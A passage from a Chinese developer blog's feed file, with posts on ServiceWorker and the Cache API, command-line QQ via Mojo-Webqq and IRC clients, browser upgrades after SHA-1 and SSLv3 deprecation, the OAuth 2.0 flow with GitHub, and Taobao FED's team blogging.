function_">addEventListener</span>(<span class="string">&quot;fetch&quot;</span>, <span class="keyword">function</span>(<span class="params">evt</span>) &#123;</span><br><span class="line">  evt.<span class="title function_">respondWith</span>(<span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params">resolve, reject</span>)&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">      <span class="title function_">resolve</span>(<span class="keyword">new</span> <span class="title class_">Response</span>(“<span class="title class_">Hi</span>, <span class="title class_">Barret</span> <span class="title class_">Lee</span>”));</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125;));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>由于 Fetch API 提供了对 Header 头的修改，我们几乎可以利用 ServiceWorker 实现真实 HTTP Server 的基本功能。</p><p>ServiceWorker 一定程度上改变了 Web 协作的交互模式，传统情况下，我们需要开启一个 Web Server，或者让其他人提供 HTTP Server，前后端之间交互，沟通成本比较高。而 ServiceWorker 把 HTTP Server 搬到了客户端，我们可以在浏览器上轻松 Hold 住两端的操作。这也算是 Web 技术栈融合的表现吧。</p><p>当我们的目光放在 HTTP 的交互上，ServiceWorker 会有无限的想象空间，比如对 History API 的延伸思考，跨页面共享问题，前端请求合并和分拆问题，mock 数据问题，前后端的联调问题，类 graphQL 问题，数据的缓存更新和复用问题等等。</p><h3 id="Cache-API"><a href="#Cache-API" class="headerlink" title="Cache API"></a>Cache API</h3><p>Cache API，简而言之就是一个 Request&#x2F;Response 的缓存对象组，它的生命周期跟 ServiceWorker 是紧密相连的，它没有失效时间，不删除就会一直保持原样。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">caches.<span class="title function_">open</span>(<span class="string">&#x27;test-cache&#x27;</span>).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">cache</span>) &#123;</span><br><span class="line">  cache.<span class="title function_">add</span>(<span class="string">&#x27;/index.html&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>一个简单的操作，就将 <code>/index.html</code> 这个页面缓存了下来，如果你使用的是最新版的 Chrome，可以打开 DevTools &gt; Resources &gt; Cache Storage，多了一个 <code>test-cache</code> 的缓存表，表中多出一项，Request 为 <code>http://barretlee.com/index.html</code>, Response 为 <code>OK</code>。如下方式可以查看缓存内容：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">caches.<span class="title function_">open</span>(<span class="string">&#x27;test-cache&#x27;</span>).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">cache</span>) &#123; </span><br><span class="line">  cache.<span class="title function_">keys</span>().<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">cachedRequests</span>) &#123; </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(cachedRequests);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>当浏览器处于 idle（空闲） 状态的时候，会将 Cache 资源预加载到本地。这也让我想起了 link 标签中有一个 prefetch 功能，也会有同学想到 Manifest，不过这两个东西都是不能友好控制的，而 Cache 给我们带来了这样的便利。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>我一直相当看好 Fetch API 系列相关的新接口，它的特点也很清晰，首先是基于 Promise 的实现，这个实现解决了回调和状态控制的问题，然后是提供了应用级别的接口访问，现在可以把一个 HTTP 请求作为可控的对象随意操作，无论是 Request 还是 Response 都在我们的掌握之中，同时也一定程度解决了跨页面资源共享的问题（至于跨页面通讯，我们有 postMessage 和 MessageChannel 等工具）。</p><p>目前浏览器对 Fetch API 和 ServiceWorker 的支持都是比较可观的，虽然 W3C 上的文档状态还是 Draft 模式，相信随着我们对业务需求的更加明确，对前端认知的的不断深入，这些东西将很快被定为 RFC。</p><p>本文没有对 API 的使用做深入的说明，一方面是因为这些东西能在 Google 上找到，其次，我觉得有些 API 的设计上还不够成熟，今后会有增删，感兴趣的同学可以去 W3C 提供的文档中深入学习下。</p><h3 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h3><ul><li><a href="http://www.html5rocks.com/zh/tutorials/file/xhr2/">http://www.html5rocks.com/zh/tutorials/file/xhr2/</a></li><li><a href="http://www.web-tinker.com/article/20882.html">http://www.web-tinker.com/article/20882.html</a></li><li><a href="http://davidwalsh.name/fetch">http://davidwalsh.name/fetch</a></li><li><a href="http://developer.mozilla.org/en-US/docs/Web/API/Cache">http://developer.mozilla.org/en-US/docs/Web/API/Cache</a></li><li><a href="http://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API">http://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
          <category> 网络交互 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cache </tag>
            
            <tag> ServiceWorker </tag>
            
            <tag> Fetch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>开启命令行下的社交</title>
      <link href="/blog/2016/02/14/mojo-webqq-and-irc/"/>
      <url>/blog/2016/02/14/mojo-webqq-and-irc/</url>
      
        <content type="html"><![CDATA[<p>最近一直在命令行下工作，除了 Google Chrome，几乎很少接触 GUI 相关的软件。前段时间把手机上的 QQ 给卸载了，希望可以把时间凝聚在更加有价值的位置，今天突然又想起了这个软件，突发奇想，在命令行下玩弄 QQ。</p><span id="more"></span><p>在知乎和 V2ex 上搜了一番，在 github 上找到了一个还比较满意的开源项目，使用 perl 语言编写的，虽然不动 perl ，但是人家提供了丰富的 API 可以调用，于是就深入了解了下。</p><p><img src="/../blogimgs/2016/02/14/20160202_f7aea0c0.png" alt="img"></p><h3 id="Mojo-Webqq-的安装和使用"><a href="#Mojo-Webqq-的安装和使用" class="headerlink" title="Mojo-Webqq 的安装和使用"></a>Mojo-Webqq 的安装和使用</h3><p>项目名称叫做 Mojo-Webqq，它应该算是 smartQQ 的客户端非 GUI 框架，前几年玩 Linux 的人可能对 smartQQ 比较了解，就是一个网页上跑的 QQ，不过现在已经更名为 WebQQ 了，玩耍地址：<a href="http://web2.qq.com/">http://web2.qq.com/</a>。</p><p>估计作者也是一个 Linux 玩家，所有的安装指南都是 Linux 上的说明，我用的 mac，也尝试按照 ReadMe 文档安装了下。</p><p>1.首先配置 cpan，直接在命令行输入 cpan 按照提示选择默认配置即可。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cpan</span><br></pre></td></tr></table></figure><p>2.然后安装 cpanm 工具</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ can -i App:coanminus</span><br></pre></td></tr></table></figure><p>3.使用 cpanm 在线安装 Mojo:Webqq 模块</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cpanm -v Mojo::Webqq</span><br></pre></td></tr></table></figure><p>不了解 Perl 语言，也不知道 cpanm 是个什么东西，估计跟 Nodejs 的 npm 是一样的，包管理工具。</p><p>如果期间安装失败，很可能是某个依赖包安装不成功，这个时候多留意下错误提示，然后 google 搜索怎样安装才是正确的姿势。</p><p>使用方式就比较简单了，创建一个实例跑起来：</p><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env perl</span></span><br><span class="line"><span class="keyword">use</span> Mojo::Webqq;</span><br><span class="line"><span class="keyword">my</span> ($qq,$host,$port,$post_api);</span><br><span class="line"></span><br><span class="line">$qq = <span class="number">12345678</span>;    <span class="comment">#修改为你自己的实际QQ号码</span></span><br><span class="line">$host = <span class="string">&quot;0.0.0.0&quot;</span>; <span class="comment">#发送消息接口监听地址，修改为自己希望监听的地址</span></span><br><span class="line">$port = <span class="number">5000</span>;      <span class="comment">#发送消息接口监听端口，修改为自己希望监听的端口</span></span><br><span class="line">$post_api = <span class="string">&#x27;http://xxxx&#x27;</span>;  <span class="comment">#接收到的消息上报接口，如果不需要接收消息上报，可以删除此行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $client = Mojo::Webqq-&gt;new(<span class="string">qq=&gt;$qq</span>);</span><br><span class="line">$client-&gt;login();</span><br><span class="line">$client-&gt;load(<span class="string">&quot;ShowMsg&quot;</span>);</span><br><span class="line">$client-&gt;load(<span class="string">&quot;Openqq&quot;</span>,<span class="string">data=&gt;</span>&#123;<span class="string">listen=&gt;</span>[&#123;<span class="string">host=&gt;$host</span>,<span class="string">port=&gt;$port</span>&#125;], <span class="string">post_api=&gt;$post_api</span>&#125;);</span><br><span class="line">$client-&gt;run();</span><br></pre></td></tr></table></figure><p>上述代码保存成 xxxx.pl 文件，然后使用 perl 来运行，就会完成 QQ 登录并在本机产生一个监听指定地址端口的 http server，发送好友消息的接口调用示例：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://127.0.0.1:5000/openqq/send_message?qq=xxxxx&amp;content=hello</span><br></pre></td></tr></table></figure><p>具体可以翻阅 <a href="//github.com/sjdy521/Mojo-Webqq/blob/master/README.md">文档说明</a></p><h3 id="IRC-相关学习"><a href="#IRC-相关学习" class="headerlink" title="IRC 相关学习"></a>IRC 相关学习</h3><p>以前玩 Linux 的时候就接触过一些 IRC 的客户端，当时感觉找到了这个世界对程序员开放的窗口，各种技术 Channel，各种交流，很是激动（当然，现在不以为然）。</p><p>Google 找了下网上的推荐，一般都是使用 Weechat 或者 irssi。两个软件的安装都比较麻烦，依赖了很多软件包，不说安装和编译时间，就依赖软件包的下载时间就有半小时。</p><p>先选用的 Weechat ，安装好了之后，死活调不好中文设置，不知道这样是不是正确的：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">/charset <span class="built_in">decode</span> GB2312</span><br></pre></td></tr></table></figure><p>反正我是没搞好，但是学会了 IRC 的基本使用。后面还是改用成 irssi，展示没有 weechat 友好，不过默认支持中文输入。</p><p>IRC 的使用，我觉得也不用太多地去看文档，进入交互命令行之后，键入 <code>/help</code>，系统会把所有的命令都打印出来，然后你感觉应该用哪个就去继续学习就行了，比如连接到一个频道，可以键入</p><figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line">/help <span class="keyword">server</span></span><br></pre></td></tr></table></figure><p>或者 </p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">/help</span> <span class="keyword">connect</span></span><br></pre></td></tr></table></figure><p>这些关键词都是从 <code>/help</code> 中找到的，以 weechat 为例，给出几个设置命令以供入门。</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加一个 server</span></span><br><span class="line"><span class="built_in">/server </span><span class="built_in">add</span> free node chat.freenode.net</span><br><span class="line"><span class="comment"># 自动链接到 freenode</span></span><br><span class="line">/<span class="built_in">set</span> irc.server.freenode.autoconnect on</span><br><span class="line"><span class="comment"># 设置 nicks，username，realname</span></span><br><span class="line">/<span class="built_in">set</span> irc.server.freenode.nicks “nickname”</span><br><span class="line">/<span class="built_in">set</span> irc.server.freenode.username “username”</span><br><span class="line">/<span class="built_in">set</span> irc.server.freenode.realname “realname”</span><br></pre></td></tr></table></figure><p>输入框中键入 <code>/connect freenode</code> 就可连接到 freenode 的服务器,输入 <code>/join #javascript</code> 就可以加入到 #javascript 群组里了。</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 自动认证 nickname</span></span><br><span class="line">/<span class="built_in">set</span> irc.server.freenode.command <span class="string">&quot;/msg nickserv identify xxxxxx&quot;</span></span><br><span class="line"><span class="comment"># 自动加入群组</span></span><br><span class="line">/<span class="built_in">set</span> irc.server.freenode.autojoin <span class="string">&quot;#channel1,#channel2&quot;</span></span><br></pre></td></tr></table></figure><p>对鼠标的支持：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动鼠标支持</span></span><br><span class="line">/moune <span class="built_in">enable</span></span><br><span class="line"><span class="comment"># 打开时就支持</span></span><br><span class="line">/<span class="built_in">set</span> weechat.look.mouse on</span><br></pre></td></tr></table></figure><p>更多文档，可以在 google 中检索下。</p><p>有好多天没有码字了，今天学习的主题是 Mojo-Webqq 和 IRC，就先说这么多，后续会把每天学习和关注的知识点都记录下，方便自己，也方便他人。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
          <category> 网络技术 </category>
          
          <category> Linux </category>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mojo-WebQQ </tag>
            
            <tag> IRC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2016，低版本浏览器活不过这一年</title>
      <link href="/blog/2016/01/14/update-your-browser/"/>
      <url>/blog/2016/01/14/update-your-browser/</url>
      
        <content type="html"><![CDATA[<p>公司在 15 年下半年完成了全站的 https 升级工作，完成时对外宣称「我们是目前为止唯一一家全站启用 https 的电商公司」，这是一份荣誉，全站 https 意味着在技术上更大程度地保障了消费者的信息和交易安全。</p><p>有一个消息也点燃了大家心中的另一个激情：“所有证书供应商从 16 年 1 月 1 日开始不再签发 SHA-1 签名的证书”，我们很早就看到 https 网页在 Firefox 的控制台中一堆黄色警报，警告 SHA-1 证书不安全。但是升级到 SHA-256 之后，会出现一些问题，部分浏览器会打不开网页，只能引导这些用户升级他们的浏览器。</p><p>但是让用户升级浏览器，何止这一个理由呀！</p><span id="more"></span><h3 id="低版本浏览器安全堪忧"><a href="#低版本浏览器安全堪忧" class="headerlink" title="低版本浏览器安全堪忧"></a>低版本浏览器安全堪忧</h3><p>有这么几则背景：</p><ol><li>从 16 年 1 月 20 号开始，微软不再支持 IE7&#x2F;8 的升级（14 年 4 月 8 号就停止了对 IE6 的升级支持），对于这部分用户如果不升级到最新的浏览器，未来如果报出漏洞，可能会导致用户数据出现泄漏。</li><li>SHA-1 签名的证书被证明已经可以在短时间内破解，所有证书供应商从 16 年 1 月 1 日开始不再签发 SHA-1 签名的证书，所有浏览器和操作系统也会将 SHA-1 证书标记为不安全。</li><li>SSLv3 已经诞生了 18 年，最近公开的 POODLE 攻击也基本宣告 SSLv3 不再安全，并且 IETF 已经将 SSLv3 作为不安全的算法。</li></ol><p>对低版本浏览器的兼容，不仅仅让前端工程师头疼，也让很多运维同学和安全同学苦恼，因为低版本的浏览器不支持 HSTS（出现对 https 的劫持攻击问题）、前向加密（RSA 交换的密钥未来可以被破解）、TLS1.2、SNI、session ticket、OCSP stapling 等特性。</p><p>这段时间，微软不断爆出新闻，通知用户，不再为 IE11 以下版本的浏览器和 win8.1 版本以下的系统提供技术支持。在这个大数据交互为背景的互联网时代，一个安全漏洞就可能让大面积的开发者捉襟见肘。</p><h3 id="国内大公司的反应"><a href="#国内大公司的反应" class="headerlink" title="国内大公司的反应"></a>国内大公司的反应</h3><p>BAT 三巨头，我就说说阿里巴巴吧，毕竟是自己服务的公司。</p><p>阿里巴巴也在逐步去除对 IE6、7 浏览器的支持，并且逐步将 PC 端的 SHA-1 签名证书和 SSLV3 算法下线，可以看到有些客户端访问阿里巴巴的页面会跳转到这个链接：<a href="http://www.taobao.com/markets/tbhome/ali-page-updater">http://www.taobao.com/markets/tbhome/ali-page-updater</a> 。</p><p><img src="/../blogimgs/2016/01/14/20160104_adb5e2a1.png" alt="阿里巴巴-低版本浏览器升级提示"></p><p>并且在一些页面中，低版本的 IE 也会弹出提示框：</p><p><img src="/../blogimgs/2016/01/14/20160104_587c7ec3.png" alt="淘宝首页-低版本浏览器升级提示"></p><p>天猫也是如此：</p><p><img src="/../blogimgs/2016/01/14/20160104_b41635cc.png" alt="天猫首页-低版本浏览器升级提示"></p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>上面提到的安全问题，受影响的不仅仅是 IE 用户，还有 Android 2.3 版本以下用户，使用这些设备的用户占比已经很低很低了。</p><p>这些内容足以看出，2016 年，那些低版本浏览器将离开中国的历史舞台了。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 低版本浏览器 </tag>
            
            <tag> 升级浏览器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简述 OAuth 2.0 的运作流程</title>
      <link href="/blog/2016/01/10/oauth2-introduce/"/>
      <url>/blog/2016/01/10/oauth2-introduce/</url>
      
        <content type="html"><![CDATA[<p>本文将以用户使用 github 登录网站留言为例，简述 OAuth 2.0 的运作流程。</p><span id="more"></span><p>假如我有一个网站，你是我网站上的访客，看了文章想留言表示「朕已阅」，留言时发现有这个网站的帐号才能够留言，此时给了你两个选择：一个是在我的网站上注册拥有一个新账户，然后用注册的用户名来留言；一个是使用 github 帐号登录，使用你的 github 用户名来留言。前者你觉得过于繁琐，于是惯性地点击了 github 登录按钮，此时 OAuth 认证流程就开始了。</p><p>需要明确的是，即使用户刚登录过 github，我的网站也不可能向 github 发一个什么请求便能够拿到访客信息，这显然是不安全的。就算用户允许你获取他在 github 上的信息，github 为了保障用户信息安全，也不会让你随意获取。所以操作之前，我的网站与 github 之间需要要有一个协商。</p><h4 id="1-网站和-Github-之间的协商"><a href="#1-网站和-Github-之间的协商" class="headerlink" title="1. 网站和 Github 之间的协商"></a>1. 网站和 Github 之间的协商</h4><p>Github 会对用户的权限做分类，比如读取仓库信息的权限、写入仓库的权限、读取用户信息的权限、修改用户信息的权限等等。如果我想获取用户的信息，Github 会要求我，先在它的平台上注册一个应用，在申请的时候标明需要获取用户信息的哪些权限，用多少就申请多少，并且在申请的时候填写你的网站域名，Github 只允许在这个域名中获取用户信息。</p><p>此时我的网站已经和 Github 之间达成了共识，Github 也给我发了两张门票，一张门票叫做 Client Id，另一张门票叫做 Client Secret。</p><h4 id="2-用户和-Github-之间的协商"><a href="#2-用户和-Github-之间的协商" class="headerlink" title="2. 用户和 Github 之间的协商"></a>2. 用户和 Github 之间的协商</h4><p>用户进入我的网站，点击 github 登录按钮的时候，我的网站会把上面拿到的 Client Id 交给用户，让他进入到 Github 的授权页面，Github 看到了用户手中的门票，就知道这是我的网站让他过来的，于是它就把我的网站想要获取的权限摆出来，并询问用户是否允许我获取这些权限。</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span> 用户登录 github，协商</span><br><span class="line">GET <span class="regexp">//gi</span>thub.com<span class="regexp">/login/</span>oauth/authorize</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> 协商凭证</span><br><span class="line">params = &#123;</span><br><span class="line">  client_id: <span class="string">&quot;xxxx&quot;</span>,</span><br><span class="line">  redirect_uri: <span class="string">&quot;http://my-website.com&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果用户觉得我的网站要的权限太多，或者压根就不想我知道他这些信息，选择了拒绝的话，整个 OAuth 2.0 的认证就结束了，认证也以失败告终。如果用户觉得 OK，在授权页面点击了确认授权后，页面会跳转到我预先设定的 <code>redirect_uri</code> 并附带一个盖了章的门票 code。</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span> 协商成功后带着盖了章的 code</span><br><span class="line">Location: http:<span class="regexp">//my</span>-website.com?code=xxx</span><br></pre></td></tr></table></figure><p>这个时候，用户和 Github 之间的协商就已经完成，Github 也会在自己的系统中记录这次协商，表示该用户已经允许在我的网站访问上直接操作和使用他的部分资源。</p><h4 id="3-告诉-Github-我的网站要来拜访了"><a href="#3-告诉-Github-我的网站要来拜访了" class="headerlink" title="3. 告诉 Github 我的网站要来拜访了"></a>3. 告诉 Github 我的网站要来拜访了</h4><p>第二步中，我们已经拿到了盖过章的门票 code，但这个 code 只能表明，用户允许我的网站从 github 上获取该用户的数据，如果我直接拿这个 code 去 github 访问数据一定会被拒绝，因为任何人都可以持有 code，github 并不知道 code 持有方就是我本人。</p><p>还记得之前申请应用的时候 github 给我的两张门票么，Client Id 在上一步中已经用过了，接下来轮到另一张门票 Client Secret。</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span> 网站和 github 之间的协商</span><br><span class="line">POST <span class="regexp">//gi</span>thub.com<span class="regexp">/login/</span>oauth/access_token</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> 协商凭证包括 github 给用户盖的章和 github 发给我的门票</span><br><span class="line">params = &#123;</span><br><span class="line">  code: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">  client_id: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">  client_secret: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">  redirect_uri: <span class="string">&quot;http://my-website.com&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拿着用户盖过章的 code 和能够标识个人身份的 client_id、client_secret 去拜访 github，拿到最后的绿卡 access_token。</p><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 拿到最后的绿卡</span></span><br><span class="line"><span class="attr">response</span> <span class="operator">=</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="symbol">  access_token:</span> <span class="string">&quot;e72e16c7e42f292c6912e7710c838347ae178b4a&quot;</span></span><br><span class="line"><span class="symbol">  scope:</span> <span class="string">&quot;user,gist&quot;</span></span><br><span class="line"><span class="symbol">  token_type:</span> <span class="string">&quot;bearer&quot;</span>,</span><br><span class="line"><span class="symbol">  refresh_token:</span> <span class="string">&quot;xxxx&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="4-用户开始使用-github-帐号在我的页面上留言"><a href="#4-用户开始使用-github-帐号在我的页面上留言" class="headerlink" title="4. 用户开始使用 github 帐号在我的页面上留言"></a>4. 用户开始使用 github 帐号在我的页面上留言</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span> 访问用户数据</span><br><span class="line">GET <span class="regexp">//</span>api.github.com/user?access_token=e72e16c7e42f292c6912e7710c838347ae178b4a</span><br></pre></td></tr></table></figure><p>上一步 github 已经把最后的绿卡 access_token 给我了，通过 github 提供的 API 加绿卡就能够访问用户的信息了，能获取用户的哪些权限在 response 中也给了明确的说明，scope 为 user 和 gist，也就是只能获取 user 组和 gist 组两个小组的权限，user 组中就包含了用户的名字和邮箱等信息了。</p><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 告诉我用户的名字和邮箱</span></span><br><span class="line"><span class="attr">response</span> <span class="operator">=</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="symbol">  username:</span> <span class="string">&quot;barretlee&quot;</span>,</span><br><span class="line"><span class="symbol">  email:</span> <span class="string">&quot;barret.china@gmail.com&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>整个 OAuth2 流程在这里也基本完成了，文章中的表述很粗糙，比如 access_token 这个绿卡是有过期时间的，如果过期了需要使用 refresh_token 重新签证。重点是让读者理解整个流程，细节部分可以阅读 <a href="http://www.rfcreader.com/#rfc6749">RFC6749 文档</a>。</p><p>希望对你理解 OAuth 2.0 有帮助。（本文完）</p>]]></content>
      
      
      <categories>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OAuth2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简述淘宝团队的技术沉淀和对外分享</title>
      <link href="/blog/2016/01/08/share-in-team/"/>
      <url>/blog/2016/01/08/share-in-team/</url>
      
        <content type="html"><![CDATA[<p>去年下半年开始，我负责淘宝前端团队（Taobao FED）的对外运营，比较重要的点就是<a href="http://taobaofed.org/">「团队博客」</a>，坚持了三个多月的每日一文，很多朋友不禁惊叹，“你们实在太高产！”。</p><span id="more"></span><p>经常写博客的人都知道，写一篇有价值的技术文章是一件挺费时费力的事情。很多善于分享的同学，也只能做到每月两三篇，由于业务压力，偶尔一两个月还没有产出。倘若看到有人每天发一篇高质量的文章，下巴当然会掉到地上。撑起大拇指的同时，心里也在嘀咕，为何可以持久保持？是不是写文章也背了 KPI？最近也有不少人向我取经。</p><h3 id="团队分享氛围的形成"><a href="#团队分享氛围的形成" class="headerlink" title="团队分享氛围的形成"></a>团队分享氛围的形成</h3><p>分享和沉淀是团队基础建设的一部分，没有分享没有记录，很多交流和学习的东西就沉淀不下来。一个没有沉淀的团队，新成员需要长时间的踩坑和磨合才能得以成长，团队各个小组的信息互通不顺畅、信息不对称，同时也难以对外形成一定的影响力。</p><p>14 年 3 月份开始，我来淘宝这边实习。淘宝这边的东西太多了，基础框架、开发工具、前端规范、安全守则、搭建平台、业务沟通等等，对一个新人来说，了解并掌握团队整个一套真不是实习两个月就能搞定的。所以学习成了一个最大的主题，每天都是学习 &amp; 基本的业务沟通，会有很多疑问，也会不断地去提问。</p><p>实习生没有 KPI，跟正式员工的差异在于，除了要投入到业务生产之中，还要不断地学习并融入到这个团队，所以做淘宝的实习生也是比较辛苦的事情。虽说没有 KPI，但是也得写写实习规划，写一些自己对自己的期望，Team Leader 也会对实习生有一些期望，两个期望之间有很多契合点，比如了解业务，有思考，有沉淀，有分享。刚开始，实习生难以在业务开发中出技术亮点，不过一些好的想法和思考会引起团队其他同学的关注，也会给自己带来机会，比如 Team Leader 会把你放到更加适合你的位置上锻炼你。</p><p>阿里巴巴有很多很多很多个部门，每个部门（BU）都会有自己的技术团队，前端团队、后端团队、PE、QA 等等，内部有一个博客平台，这个平台上有以圈子为维度聚合的，如 Node.js 糯米圈、全站 HTTPS、JVM 交流答疑、跨终端等等几百个圈子；也有以 BU 为维护聚合的，每个 BU 的 Team Leader 创建圈子后将整个团队的人员拉进来。很多人在这个博客平台上分享，公司几万人，可以想象这里沉淀的内容体量有多么庞大，知识领域包括：Java核心技术, 前端与交互设计, 安全与风控, 系统软件, 测试技术, 编程语言, 架构, 数据存储与数据库, 引擎技术, 项目管理与软件工程, 移动开发与客户端, 系统研发与运维, 互联网产品及应用, 分布式系统与计算, 开发框架与中间件, 算法, 网络与数据通信等等。</p><p>所以几乎任何问题都能够在这里找到答案，也能在众多圈子中找到帮助你解决问题的人。有人看就会有人写，有人点赞，有人收藏，有人评论；除了页面上的分享，还有 BU 之间的交流，团队之间的沟通，前后端之间的相互学习；还有前端夜校、集团夜校，下班了不想走就参加夜校培训学习。阿里巴巴在技术交流这一块做的还是相当不错的。</p><h3 id="团队知识沉淀的对外传播"><a href="#团队知识沉淀的对外传播" class="headerlink" title="团队知识沉淀的对外传播"></a>团队知识沉淀的对外传播</h3><p>在一个善于分享的团队中，时间久了自己也会被薰陶成一个善于分享的人。无论是业务的思考还是技术的学习，很多同学会把好的东西写下来分享给其他人，在分享的过程中有人跟你一起交流，指出你思考中的不完善的地方，相互提高。这是老大们期望看到的结果，他们也会主动参与和推动，经常分享一些想法引来讨论，这样很利于带动团队的共同进步。</p><p>内部博客平台上很多东西是不能对外的，业务耦合度太高，并且参合了对业务的思考中很多数据，所以对外传播也需要有一个流程。</p><p>淘宝 FED 的博客是静态发布的，托管在 github&#x2F;gitcafe 上，为了更好地筛选、过滤和检测博客内容，我做了一个博客后台，对博客文章格式和图片做了硬性的规定，比如：</p><ul><li>文章必须有题图，题图尺寸为 900x500</li><li>文章格式符合文档通用规范，针对规范的细节，开发了检测工具，比如全角和半角的使用、中英文之间的空格、专有词汇的大小写等等</li></ul><p>文章只有 Team Leader 才有权限发布到后台系统，所有 TL 都必须看一遍发布的文章，并且对数据脱敏，确保对外发布是安全的。博客后台的所有操作都不会同步到外网，最后会由我确认一遍，然后手动同步。</p><p>这里可以给大家推荐几个没有版权问题的图片下载地址：</p><ul><li><a href="http://publicdomainarchive.com/">http://publicdomainarchive.com/</a></li><li><a href="http://www.gratisography.com/">http://www.gratisography.com/</a></li><li><a href="http://unsplash.com/">http://unsplash.com/</a></li><li><a href="http://picjumbo.com/">http://picjumbo.com/</a></li><li><a href="http://pixabay.com/">http://pixabay.com/</a></li></ul><p>规范和流程只是最后环节，重点还是需要团队有人分享。</p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>工作日每日一文，已经坚持三个多月了。当初规划的发布时间是：</p><ul><li>周一：web 开发</li><li>周二、周四：node</li><li>周三：无线</li><li>周五：工具平台</li><li>时而：团队生活</li></ul><p>这个频率对一个团队来说，也是够呛的。有的时候也会出现某个分类下，同学们的产出并不多，比如无线方面。从中也能体现了一个问题，那就是团队在无线方面的钻研还不够深入。</p><p>我每天都会花费 10-40 分钟来传播这些内容，在 QQ 群，朋友圈和微博上，传播的目的很简单，跟大家交流，收集大家的意见，同时也会对内容做一些答疑。</p><p>后续发布频率会降低一些，每周 2-3 篇，保证质量，也保证热度。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分享 </tag>
            
            <tag> 团队 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>时间都去哪儿了？</title>
      <link href="/blog/2016/01/03/where-is-time-goning/"/>
      <url>/blog/2016/01/03/where-is-time-goning/</url>
      
